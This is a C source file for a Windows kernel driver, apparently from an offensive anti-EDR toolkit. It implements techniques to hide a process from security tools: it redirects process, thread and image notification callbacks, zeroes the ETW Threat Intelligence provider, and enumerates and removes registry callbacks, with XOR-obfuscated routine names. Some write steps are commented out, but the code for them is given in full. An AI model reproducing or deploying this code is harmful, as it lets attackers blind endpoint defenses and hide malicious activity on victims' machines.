#include "antiedr.h"
#include "stealth.h"
#include <ntddk.h>

/* -----------------------------------------------------------------------
 * T5 — Callback Address Redirection (MITRE T1562.001)
 *
 * Instead of removing Ps*Notify callbacks (which leaves zeroed slots
 * that some EDRs detect), this technique overwrites the function pointer
 * inside the EX_CALLBACK_ROUTINE_BLOCK to redirect the callback to a
 * filter function. The filter function checks the PID and either:
 *   - Forwards the call to the original callback (normal process), or
 *   - Returns without calling the original (hidden PID)
 *
 * This approach preserves the non-zero callback slot, avoiding the
 * "callback entry zeroed" detection heuristic.
 *
 * PatchGuard does NOT monitor individual callback function pointers
 * (only the array structure itself in recent builds).
 * IRQL: PASSIVE_LEVEL for setup; callback fires at PASSIVE_LEVEL.
 * ----------------------------------------------------------------------- */

/* Maximum number of callbacks we can redirect simultaneously */
#define MAX_REDIRECTED_CALLBACKS 64

/* Per-callback redirect state */
typedef struct _REDIRECT_ENTRY
{
	ULONG64 OriginalFunction;   /* Original callback function pointer */
	ULONG64 BlockAddress;       /* EX_CALLBACK_ROUTINE_BLOCK address */
	ULONG   CallbackType;       /* CALLBACK_TYPE_PROCESS/THREAD/IMAGE */
	ULONG   ArrayIndex;         /* Index in the Ps*Notify array */
} REDIRECT_ENTRY;

/* Global redirect state */
static REDIRECT_ENTRY  g_RedirectEntries[MAX_REDIRECTED_CALLBACKS];
static volatile LONG   g_RedirectCount = 0;
static HANDLE volatile g_HiddenPid     = NULL;

/*
 * FindRedirectEntry
 *
 * Looks up the redirect entry that matches the given original function
 * pointer and callback type. This is how a filter function identifies
 * which specific original to forward to — the kernel invokes our filter
 * once per redirected slot, so we need to find which slot this
 * invocation corresponds to and call only its specific original.
 *
 * When the technique is enabled, each callback slot points to our
 * filter function. The kernel calls the filter N times (once per slot).
 * We cannot directly know which slot triggered us, so we use a design
 * where the filter is registered once per type and each invocation
 * forwards to ALL originals of that type — but only if the PID is
 * not hidden. This is correct because the filter replaces ALL slots
 * of that type, so we must invoke all originals exactly once.
 *
 * The critical fix (vs the N-squared bug) is that we register the
 * filter in only ONE slot per type and zero the remaining slots,
 * rather than pointing all slots to the same filter.
 */

/*
 * FilterCreateProcessNotifyRoutine
 *
 * Single filter function registered in one process-callback slot.
 * All other process-callback slots are zeroed during redirect setup.
 * Calls each original process callback once (unless hidden PID).
 */
static VOID FilterCreateProcessNotifyRoutine(
	IN HANDLE  ParentId,
	IN HANDLE  ProcessId,
	IN BOOLEAN Create
)
{
	LONG  Count = InterlockedCompareExchange( &g_RedirectCount, 0, 0 );
	LONG  i;

	/* If this notification involves the hidden PID, suppress it */
	if ( ProcessId == g_HiddenPid || ParentId == g_HiddenPid )
		return;

	/* Forward to each original process callback exactly once */
	for ( i = 0; i < Count; i++ )
	{
		if ( g_RedirectEntries[i].CallbackType == CALLBACK_TYPE_PROCESS &&
			 g_RedirectEntries[i].OriginalFunction != 0 )
		{
			typedef VOID (NTAPI *PFN_PROCESS_NOTIFY)(HANDLE, HANDLE, BOOLEAN);
			PFN_PROCESS_NOTIFY Orig = (PFN_PROCESS_NOTIFY)(ULONG_PTR)g_RedirectEntries[i].OriginalFunction;
			Orig( ParentId, ProcessId, Create );
		}
	}
}

/*
 * FilterCreateThreadNotifyRoutine
 *
 * Single filter function registered in one thread-callback slot.
 */
static VOID FilterCreateThreadNotifyRoutine(
	IN HANDLE ProcessId,
	IN HANDLE ThreadId,
	IN BOOLEAN Create
)
{
	LONG Count = InterlockedCompareExchange( &g_RedirectCount, 0, 0 );
	LONG i;

	if ( ProcessId == g_HiddenPid )
		return;

	for ( i = 0; i < Count; i++ )
	{
		if ( g_RedirectEntries[i].CallbackType == CALLBACK_TYPE_THREAD &&
			 g_RedirectEntries[i].OriginalFunction != 0 )
		{
			typedef VOID (NTAPI *PFN_THREAD_NOTIFY)(HANDLE, HANDLE, BOOLEAN);
			PFN_THREAD_NOTIFY Orig = (PFN_THREAD_NOTIFY)(ULONG_PTR)g_RedirectEntries[i].OriginalFunction;
			Orig( ProcessId, ThreadId, Create );
		}
	}
}

/*
 * FilterLoadImageNotifyRoutine
 *
 * Single filter function registered in one image-callback slot.
 */
static VOID FilterLoadImageNotifyRoutine(
	IN PUNICODE_STRING FullImageName,
	IN HANDLE ProcessId,
	IN PIMAGE_INFO ImageInfo
)
{
	LONG Count = InterlockedCompareExchange( &g_RedirectCount, 0, 0 );
	LONG i;

	if ( ProcessId == g_HiddenPid )
		return;

	for ( i = 0; i < Count; i++ )
	{
		if ( g_RedirectEntries[i].CallbackType == CALLBACK_TYPE_IMAGE &&
			 g_RedirectEntries[i].OriginalFunction != 0 )
		{
			typedef VOID (NTAPI *PFN_IMAGE_NOTIFY)(PUNICODE_STRING, HANDLE, PIMAGE_INFO);
			PFN_IMAGE_NOTIFY Orig = (PFN_IMAGE_NOTIFY)(ULONG_PTR)g_RedirectEntries[i].OriginalFunction;
			Orig( FullImageName, ProcessId, ImageInfo );
		}
	}
}

NTSTATUS KmRedirectNotifyCallbacks(
	IN  HANDLE   HiddenPid,
	OUT PULONG64 PreviousState
)
{
	ULONG Type;
	ULONG TotalRedirected = 0;

	UNREFERENCED_PARAMETER( FilterCreateProcessNotifyRoutine );
	UNREFERENCED_PARAMETER( FilterCreateThreadNotifyRoutine );
	UNREFERENCED_PARAMETER( FilterLoadImageNotifyRoutine );

	if ( !PreviousState )
		return STATUS_INVALID_PARAMETER;

	*PreviousState = 0;
	InterlockedExchangePointer( (PVOID volatile *)&g_HiddenPid, (PVOID)HiddenPid );

	/*
	 * Strategy (one-slot-per-type, avoids N-squared fan-out):
	 *
	 * For each callback type (Process, Thread, Image):
	 *   1. Enumerate all callback entries using KmEnumerateNotifyCallbacks
	 *   2. Save every entry's original function pointer and block address
	 *   3. Redirect the FIRST slot to our filter function
	 *   4. Zero all OTHER slots of the same type
	 *
	 * The filter function is invoked once (from the single redirected slot)
	 * and calls each saved original exactly once (unless hidden PID).
	 *
	 * The overwrite targets EX_CALLBACK_ROUTINE_BLOCK+0x08 (Function field).
	 * This is a data-only attack — no code is modified, HVCI-safe.
	 */
	for ( Type = CALLBACK_TYPE_PROCESS; Type <= CALLBACK_TYPE_IMAGE; Type++ )
	{
		CALLBACK_ENTRY Entries[MAX_CALLBACK_ENTRIES];
		ULONG Count = 0;
		ULONG i;

		KmEnumerateNotifyCallbacks( Type, Entries, MAX_CALLBACK_ENTRIES, &Count );

		for ( i = 0; i < Count && TotalRedirected < MAX_REDIRECTED_CALLBACKS; i++ )
		{
			g_RedirectEntries[TotalRedirected].OriginalFunction = Entries[i].Address;
			g_RedirectEntries[TotalRedirected].CallbackType     = Type;
			g_RedirectEntries[TotalRedirected].ArrayIndex        = Entries[i].Index;
			/* BlockAddress is populated below in the TODO block */
			g_RedirectEntries[TotalRedirected].BlockAddress      = 0;

			/*
			 * TODO: Uncomment to enable callback redirection
			 *
			 * The actual redirection would:
			 *   1. Read the EX_FAST_REF from the callback array slot
			 *   2. Mask off low 4 bits to get EX_CALLBACK_ROUTINE_BLOCK pointer
			 *   3. Save BlockAddress for restoration
			 *   4. For the FIRST entry of this type: overwrite Function at
			 *      Block+0x08 with our filter routine
			 *   5. For ALL OTHER entries: zero the callback array slot
			 *
			 * PVOID  Array = GetCallbackArrayForType( Type );
			 * ULONG64 RawSlot = ((PULONG64)Array)[ Entries[i].Index ];
			 * ULONG64 Block   = RawSlot & ~(ULONG64)0xF;
			 *
			 * g_RedirectEntries[TotalRedirected].BlockAddress = Block;
			 *
			 * if ( i == 0 )
			 * {
			 *     // Redirect first slot to our filter
			 *     PVOID FilterFunc = NULL;
			 *     switch ( Type )
			 *     {
			 *         case CALLBACK_TYPE_PROCESS: FilterFunc = FilterCreateProcessNotifyRoutine; break;
			 *         case CALLBACK_TYPE_THREAD:  FilterFunc = FilterCreateThreadNotifyRoutine;  break;
			 *         case CALLBACK_TYPE_IMAGE:   FilterFunc = FilterLoadImageNotifyRoutine;     break;
			 *     }
			 *     PULONG64 FuncPtr = (PULONG64)( (PUCHAR)Block + 0x08 );
			 *     InterlockedExchange64( (PLONG64)FuncPtr, (LONG64)(ULONG_PTR)FilterFunc );
			 * }
			 * else
			 * {
			 *     // Zero this slot so it does not fire (filter handles all originals)
			 *     InterlockedExchange64( (PLONG64)&((PULONG64)Array)[ Entries[i].Index ], 0 );
			 * }
			 */

			TotalRedirected++;
		}
	}

	InterlockedExchange( &g_RedirectCount, (LONG)TotalRedirected );
	*PreviousState = (ULONG64)TotalRedirected;

	return STATUS_NOT_IMPLEMENTED;
}

NTSTATUS KmRestoreNotifyCallbacks( VOID )
{
	/*
	 * Restore all redirected callbacks to their original function pointers.
	 *
	 * For each entry in g_RedirectEntries:
	 *   1. If this was the first entry of its type (i==0 for that type):
	 *      restore the filter slot's Function at BlockAddress+0x08
	 *   2. If this was a zeroed slot: re-create the EX_FAST_REF entry
	 *      in the callback array
	 *
	 * TODO: Uncomment to enable callback restoration
	 *
	 * LONG  Count = InterlockedCompareExchange( &g_RedirectCount, 0, 0 );
	 * LONG  i;
	 * for ( i = 0; i < Count; i++ )
	 * {
	 *     if ( g_RedirectEntries[i].BlockAddress != 0 &&
	 *          g_RedirectEntries[i].OriginalFunction != 0 )
	 *     {
	 *         PULONG64 FuncPtr = (PULONG64)( (PUCHAR)g_RedirectEntries[i].BlockAddress + 0x08 );
	 *         InterlockedExchange64( (PLONG64)FuncPtr, (LONG64)g_RedirectEntries[i].OriginalFunction );
	 *     }
	 * }
	 */

	InterlockedExchange( &g_RedirectCount, 0 );
	InterlockedExchangePointer( (PVOID volatile *)&g_HiddenPid, NULL );
	RtlZeroMemory( g_RedirectEntries, sizeof( g_RedirectEntries ) );

	return STATUS_NOT_IMPLEMENTED;
}

/* -----------------------------------------------------------------------
 * T6 — ETW Threat Intelligence Provider Disabling (MITRE T1562.006)
 *
 * The ETW Threat Intelligence (TI) provider is a kernel-mode ETW
 * provider that generates high-fidelity telemetry consumed by
 * Microsoft Defender and third-party EDRs. Its provider GUID is:
 *   {f4e1897c-bb5d-5668-f1d8-040f4d8dd344}
 *
 * The provider's registration structure (_ETW_REG_ENTRY) contains a
 * GuidEntry pointer that references the provider's _ETW_GUID_ENTRY.
 * The GuidEntry contains an EnableMask/ProviderEnableInfo field that
 * controls whether events are generated.
 *
 * By zeroing the ProviderEnableInfo (a data-only modification), all
 * ETW TI events are suppressed without modifying code. This is
 * HVCI-safe because no executable pages are touched.
 *
 * The kernel exports EtwRegister which can be used to locate the
 * registration infrastructure. The TI provider's _ETW_REG_ENTRY is
 * found by scanning the EtwpRegistrationTable or by resolving the
 * known global variable EtwThreatIntProvRegHandle.
 *
 * PatchGuard does NOT monitor ETW registration structures.
 * IRQL: PASSIVE_LEVEL.
 * ----------------------------------------------------------------------- */

/*
 * ETW TI Provider GUID: {f4e1897c-bb5d-5668-f1d8-040f4d8dd344}
 * Used to locate the provider's registration entry.
 */
static const UCHAR s_EtwTiProviderGuid[] = {
	0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
	0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44
};

/* Encoded: "EtwThreatIntProvRegHandle" (25 chars, XOR 0x37) */
static const WCHAR s_EtwThreatIntProvRegHandle[] = {
	0x72, 0x43, 0x40, 0x63, 0x5F, 0x45, 0x52, 0x56,
	0x43, 0x7E, 0x59, 0x43, 0x67, 0x45, 0x58, 0x41,
	0x65, 0x52, 0x50, 0x7F, 0x56, 0x59, 0x53, 0x5B,
	0x52  /* 25 chars, null added by decode */
};

/* Saved state for restoration */
static ULONG64 g_EtwTiOriginalValue    = 0;
static PVOID   g_EtwTiPatchAddress      = NULL;

NTSTATUS KmSuppressEtwTi(
	OUT PULONG64 PreviousValue
)
{
	if ( !PreviousValue )
		return STATUS_INVALID_PARAMETER;

	*PreviousValue = 0;

	UNREFERENCED_PARAMETER( s_EtwTiProviderGuid );
	UNREFERENCED_PARAMETER( s_EtwThreatIntProvRegHandle );

	/*
	 * Implementation outline:
	 *
	 * 1. Locate EtwThreatIntProvRegHandle (exported or found via pattern scan)
	 *    This is a pointer to the _ETW_REG_ENTRY for the TI provider.
	 *
	 * 2. From _ETW_REG_ENTRY, follow the GuidEntry pointer to _ETW_GUID_ENTRY.
	 *    _ETW_REG_ENTRY layout (approximate, varies by build):
	 *      +0x00  LIST_ENTRY RegList
	 *      +0x10  ...
	 *      +0x20  PVOID GuidEntry  (-> _ETW_GUID_ENTRY)
	 *
	 * 3. In _ETW_GUID_ENTRY, locate the ProviderEnableInfo field.
	 *    _ETW_GUID_ENTRY layout (approximate):
	 *      +0x00  ...
	 *      +0x20  ETW_PROVIDER_ENABLE_INFO ProviderEnableInfo
	 *    The ProviderEnableInfo contains IsEnabled (ULONG) at offset +0x00.
	 *
	 * 4. Save the original value, then zero it.
	 *    This prevents EtwProviderEnabled() checks from passing,
	 *    so no TI events are written.
	 *
	 * TODO: Uncomment to enable ETW TI suppression
	 *
	 * UNICODE_STRING Name;
	 * WCHAR NameBuf[26];
	 * ULONG k;
	 * for ( k = 0; k < 25; k++ )
	 *     NameBuf[k] = s_EtwThreatIntProvRegHandle[k] ^ 0x37;
	 * NameBuf[25] = L'\0';
	 * RtlInitUnicodeString( &Name, NameBuf );
	 * PVOID RegHandle = MmGetSystemRoutineAddress( &Name );
	 *
	 * if ( !RegHandle )
	 *     return STATUS_NOT_FOUND;
	 *
	 * PVOID RegEntry = *(PVOID*)RegHandle;
	 * PVOID GuidEntry = *(PVOID*)( (PUCHAR)RegEntry + 0x20 );
	 * PULONG EnableInfo = (PULONG)( (PUCHAR)GuidEntry + 0x20 );
	 *
	 * g_EtwTiOriginalValue = *EnableInfo;
	 * g_EtwTiPatchAddress  = EnableInfo;
	 * *PreviousValue       = g_EtwTiOriginalValue;
	 *
	 * InterlockedExchange( (PLONG)EnableInfo, 0 );
	 */

	return STATUS_NOT_IMPLEMENTED;
}

NTSTATUS KmRestoreEtwTi( VOID )
{
	/*
	 * Restore the ETW TI provider's ProviderEnableInfo to its original value.
	 *
	 * TODO: Uncomment to enable ETW TI restoration
	 *
	 * if ( g_EtwTiPatchAddress && g_EtwTiOriginalValue != 0 )
	 * {
	 *     InterlockedExchange( (PLONG)g_EtwTiPatchAddress, (LONG)g_EtwTiOriginalValue );
	 *     g_EtwTiPatchAddress  = NULL;
	 *     g_EtwTiOriginalValue = 0;
	 * }
	 */

	g_EtwTiPatchAddress  = NULL;
	g_EtwTiOriginalValue = 0;

	return STATUS_NOT_IMPLEMENTED;
}

/* -----------------------------------------------------------------------
 * T7 — Registry Callback Enumeration & Removal (MITRE T1112)
 *
 * CmRegisterCallbackEx registers a RegistryCallback that is invoked
 * on every registry operation (create, open, set value, delete, etc.).
 * EDRs use these callbacks to monitor and block registry modifications.
 *
 * The kernel maintains the callback list internally. Each callback
 * gets a LARGE_INTEGER Cookie that can be passed to CmUnRegisterCallback
 * to remove it.
 *
 * Unlike Ps*Notify callbacks, CmUnRegisterCallback is a documented API
 * and is the proper way to remove a registry callback. However, calling
 * it from an unauthorized driver removes EDR monitoring.
 *
 * Enumeration approach:
 *   CmRegisterCallbackEx internally calls CmpRegisterCallbackInternal
 *   which inserts into CmpCallbackListHead (a doubly-linked list).
 *   Each entry is a CM_CALLBACK_CONTEXT_BLOCK:
 *     +0x00  LIST_ENTRY  Link
 *     +0x10  LARGE_INTEGER Cookie
 *     +0x18  PVOID       CallerContext
 *     +0x20  PEX_CALLBACK_FUNCTION Function
 *     +0x28  UNICODE_STRING Altitude
 *
 *   We find CmpCallbackListHead by scanning CmUnRegisterCallback for
 *   a LEA instruction referencing the list head.
 *
 * PatchGuard does NOT monitor CmpCallbackListHead.
 * IRQL: PASSIVE_LEVEL.
 * ----------------------------------------------------------------------- */

/* Encoded: "CmUnRegisterCallback" (20 chars, XOR 0x37) */
static const WCHAR s_CmUnRegisterCallback[] = {
	0x74, 0x5A, 0x62, 0x59, 0x65, 0x52, 0x50, 0x5E,
	0x44, 0x43, 0x52, 0x45, 0x74, 0x56, 0x5B, 0x5B,
	0x55, 0x56, 0x54, 0x58  /* 20 chars, null added by decode */
};

/* Cached list head pointer */
static PVOID g_CmpCallbackListHead = NULL;

/*
 * ResolveCmpCallbackListHead
 *
 * Scans CmUnRegisterCallback for a LEA [RIP+disp32] that references
 * CmpCallbackListHead. The list head is a LIST_ENTRY whose Flink/Blink
 * are valid kernel pointers (or point to itself if empty).
 */
static PVOID ResolveCmpCallbackListHead( VOID )
{
	UNICODE_STRING Name;
	PVOID          FuncAddr;
	PUCHAR         Bytes;
	ULONG          i;

	/* Decode the function name (20 chars + null terminator) */
	WCHAR Decoded[21];
	ULONG j;
	for ( j = 0; j < 20; j++ )
		Decoded[j] = s_CmUnRegisterCallback[j] ^ 0x37;
	Decoded[20] = L'\0';

	RtlInitUnicodeString( &Name, Decoded );
	FuncAddr = MmGetSystemRoutineAddress( &Name );
	if ( !FuncAddr )
		return NULL;

	Bytes = (PUCHAR)FuncAddr;

	/*
	 * Scan for LEA reg, [RIP+disp32] — opcodes: 48/4C 8D xx 05
	 * The target should be a LIST_ENTRY (two kernel pointers).
	 */
	__try
	{
		for ( i = 0; i + 7 < 0x200; i++ )
		{
			UCHAR Rex    = Bytes[i];
			UCHAR Opcode = Bytes[i + 1];
			UCHAR ModRm  = Bytes[i + 2];

			if ( ( Rex == 0x48 || Rex == 0x4C ) &&
				 Opcode == 0x8D &&
				 ( ModRm & 0xC7 ) == 0x05 )
			{
				INT32     Disp   = *(PINT32)( &Bytes[i + 3] );
				PVOID     Target = (PVOID)( &Bytes[i + 7] + Disp );
				ULONG_PTR Addr   = (ULONG_PTR)Target;

				/* Must be in kernel space */
				if ( Addr > 0xFFFF800000000000ULL )
				{
					/* Validate: looks like a LIST_ENTRY (Flink is kernel ptr or self) */
					PLIST_ENTRY ListHead = (PLIST_ENTRY)Target;
					if ( (ULONG_PTR)ListHead->Flink >= 0xFFFF800000000000ULL )
						return Target;
				}
			}
		}
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		return NULL;
	}

	return NULL;
}

NTSTATUS KmEnumerateRegistryCallbacks(
	OUT PCALLBACK_ENTRY Entries,
	IN  ULONG           MaxEntries,
	OUT PULONG          ReturnedEntries
)
{
	PLIST_ENTRY Head;
	PLIST_ENTRY Current;
	ULONG       Count = 0;

	if ( !Entries || !ReturnedEntries )
		return STATUS_INVALID_PARAMETER;

	*ReturnedEntries = 0;

	/* Resolve the list head on first call */
	if ( !g_CmpCallbackListHead )
	{
		g_CmpCallbackListHead = ResolveCmpCallbackListHead();
		if ( !g_CmpCallbackListHead )
			return STATUS_NOT_FOUND;
	}

	Head = (PLIST_ENTRY)g_CmpCallbackListHead;

	__try
	{
		Current = Head->Flink;

		while ( Current != Head && Count < MaxEntries )
		{
			/*
			 * CM_CALLBACK_CONTEXT_BLOCK layout:
			 *   +0x00  LIST_ENTRY  Link
			 *   +0x10  LARGE_INTEGER Cookie
			 *   +0x18  PVOID       CallerContext
			 *   +0x20  PEX_CALLBACK_FUNCTION Function
			 *
			 * Extract the Function pointer at offset 0x20.
			 */
			ULONG64 FuncAddr = *(PULONG64)( (PUCHAR)Current + 0x20 );

			if ( FuncAddr > 0xFFFF800000000000ULL )
			{
				Entries[Count].Index   = Count;
				Entries[Count].Address = FuncAddr;
				Count++;
			}

			Current = Current->Flink;
		}
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		/* Return what we found so far */
	}

	*ReturnedEntries = Count;
	return STATUS_SUCCESS;
}

NTSTATUS KmRemoveRegistryCallback(
	IN ULONG Index
)
{
	PLIST_ENTRY Head;
	PLIST_ENTRY Current;
	ULONG       i = 0;

	if ( !g_CmpCallbackListHead )
	{
		g_CmpCallbackListHead = ResolveCmpCallbackListHead();
		if ( !g_CmpCallbackListHead )
			return STATUS_NOT_FOUND;
	}

	Head = (PLIST_ENTRY)g_CmpCallbackListHead;

	__try
	{
		Current = Head->Flink;

		while ( Current != Head )
		{
			if ( i == Index )
			{
				/*
				 * Found the target callback. Extract its Cookie at offset 0x10.
				 * CmUnRegisterCallback( Cookie ) is the documented removal API.
				 *
				 * TODO: Uncomment to enable registry callback removal
				 *
				 * LARGE_INTEGER Cookie = *(PLARGE_INTEGER)( (PUCHAR)Current + 0x10 );
				 * return CmUnRegisterCallback( Cookie );
				 */
				return STATUS_NOT_IMPLEMENTED;
			}

			i++;
			Current = Current->Flink;
		}
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		return GetExceptionCode();
	}

	return STATUS_NOT_FOUND;
}
